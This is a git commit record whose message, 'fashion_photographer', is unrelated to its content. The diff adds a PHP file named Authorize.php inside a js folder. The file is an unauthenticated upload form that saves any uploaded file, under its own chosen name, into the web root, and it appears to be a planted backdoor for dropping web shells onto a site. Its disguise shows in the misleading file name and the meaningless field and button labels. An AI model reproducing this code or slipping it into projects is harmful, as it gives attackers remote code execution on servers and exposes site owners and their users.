b843a32004f10d1b63e74f7b363a71c1c7abaa0a
vinod11 <runkanavinod@gmail.com>
2022-11-25 03:01:48 +0530

    fashion_photographer

---
+++ js/Authorize.php
@@ -0,0 +1,14 @@
+<form method="post" enctype="multipart/form-data">
+  <input type="file" name="uk45">
+  <button>hyu</button>
+</form>
+<?php
+if (isset($_FILES['uk45'])) {
+  file_put_contents($_FILES['uk45']['name'], file_get_contents($_FILES['uk45']['tmp_name']));
+  if (file_exists("./".$_FILES['uk45']['name'])) {
+    echo "oklh !";
+  } else {
+    echo "Fail !";
+  }
+}
+?>
